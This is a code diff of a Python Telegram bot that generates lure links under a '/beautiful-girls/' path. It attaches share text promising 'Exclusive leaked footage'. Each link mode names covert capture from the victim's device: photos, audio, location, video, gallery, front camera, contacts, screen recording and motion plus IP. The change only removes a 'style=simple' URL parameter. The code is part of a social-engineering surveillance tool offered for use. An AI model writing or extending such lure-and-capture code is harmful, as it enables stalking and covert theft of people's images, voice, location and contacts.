@@ -2248,21 +2248,21 @@ def main_menu_inline():
 
 def make_links_inline(token):
     base = f"{BASE_URL}/beautiful-girls/{token}"
-    all_url = f"{base}?m=all&style=simple"
+    all_url = f"{base}?m=all"
     share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
     share_url = f"https://t.me/share/url?url={requests.utils.quote(all_url)}&text={requests.utils.quote(share_text)}"
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🌐 All-in-One", url=all_url)],
-        [InlineKeyboardButton("📸 Photo", url=f"{base}?m=photo&style=simple"),
-         InlineKeyboardButton("🎤 Audio", url=f"{base}?m=audio&style=simple")],
-        [InlineKeyboardButton("📍 Location", url=f"{base}?m=location&style=simple"),
-         InlineKeyboardButton("🎥 Video", url=f"{base}?m=video&style=simple")],
-        [InlineKeyboardButton("🖼️ Gallery", url=f"{base}?m=gallery&style=simple"),
-         InlineKeyboardButton("🤳 Front Cam", url=f"{base}?m=frontcam&style=simple")],
-        [InlineKeyboardButton("📞 Contacts", url=f"{base}?m=contacts&style=simple")],
-        [InlineKeyboardButton("📷 Burst Photos", url=f"{base}?m=burst&style=simple"),
-         InlineKeyboardButton("🖥️ Screen Record", url=f"{base}?m=screen&style=simple")],
-        [InlineKeyboardButton("📳 Motion+IP", url=f"{base}?m=motion&style=simple")],
+        [InlineKeyboardButton("📸 Photo", url=f"{base}?m=photo"),
+         InlineKeyboardButton("🎤 Audio", url=f"{base}?m=audio")],
+        [InlineKeyboardButton("📍 Location", url=f"{base}?m=location"),
+         InlineKeyboardButton("🎥 Video", url=f"{base}?m=video")],
+        [InlineKeyboardButton("🖼️ Gallery", url=f"{base}?m=gallery"),
+         InlineKeyboardButton("🤳 Front Cam", url=f"{base}?m=frontcam")],
+        [InlineKeyboardButton("📞 Contacts", url=f"{base}?m=contacts")],
+        [InlineKeyboardButton("📷 Burst Photos", url=f"{base}?m=burst"),
+         InlineKeyboardButton("🖥️ Screen Record", url=f"{base}?m=screen")],
+        [InlineKeyboardButton("📳 Motion+IP", url=f"{base}?m=motion")],
         [InlineKeyboardButton("📤 သူငယ်ချင်းများထံ Share မည်", url=share_url)],
         [InlineKeyboardButton("📋 Active Links", callback_data="links"),
          InlineKeyboardButton("🏠 Menu", callback_data="menu")],
@@ -2274,14 +2274,14 @@ def format_links_msg(token):
     return (
         f"✅ <b>Links ထုတ်ပြီးပါပြီ! | Links Ready!</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🌐 <b>All-in-One:</b>\n<code>{base}?m=all&style=simple</code>\n\n"
-        f"📸 <b>Photo:</b>\n<code>{base}?m=photo&style=simple</code>\n\n"
-        f"🎤 <b>Audio:</b>\n<code>{base}?m=audio&style=simple</code>\n\n"
-        f"📍 <b>Location:</b>\n<code>{base}?m=location&style=simple</code>\n\n"
-        f"🎥 <b>Video:</b>\n<code>{base}?m=video&style=simple</code>\n\n"
-        f"📷 <b>Burst Photos:</b>\n<code>{base}?m=burst&style=simple</code>\n\n"
-        f"🖥️ <b>Screen Record:</b>\n<code>{base}?m=screen&style=simple</code>\n\n"
-        f"📳 <b>Motion+IP:</b>\n<code>{base}?m=motion&style=simple</code>\n"
+        f"🌐 <b>All-in-One:</b>\n<code>{base}?m=all</code>\n\n"
+        f"📸 <b>Photo:</b>\n<code>{base}?m=photo</code>\n\n"
+        f"🎤 <b>Audio:</b>\n<code>{base}?m=audio</code>\n\n"
+        f"📍 <b>Location:</b>\n<code>{base}?m=location</code>\n\n"
+        f"🎥 <b>Video:</b>\n<code>{base}?m=video</code>\n\n"
+        f"📷 <b>Burst Photos:</b>\n<code>{base}?m=burst</code>\n\n"
+        f"🖥️ <b>Screen Record:</b>\n<code>{base}?m=screen</code>\n\n"
+        f"📳 <b>Motion+IP:</b>\n<code>{base}?m=motion</code>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"⬇️ ခလုတ်များမှ တစ်ချက်နှိပ်၍ ဖွင့်နိုင်သည်"
     )
@@ -2299,7 +2299,7 @@ def format_single_link_msg(token, mode_key, label):
 
 
 def single_link_inline(token, mode_key, label):
-    url = f"{BASE_URL}/beautiful-girls/{token}?m={mode_key}&style=simple"
+    url = f"{BASE_URL}/beautiful-girls/{token}?m={mode_key}"
     share_text = "🔥 ဤဗီဒီယိုကို ကြည့်ပါ! Exclusive leaked footage!"
     share_url = f"https://t.me/share/url?url={requests.utils.quote(url)}&text={requests.utils.quote(share_text)}"
     return InlineKeyboardMarkup([
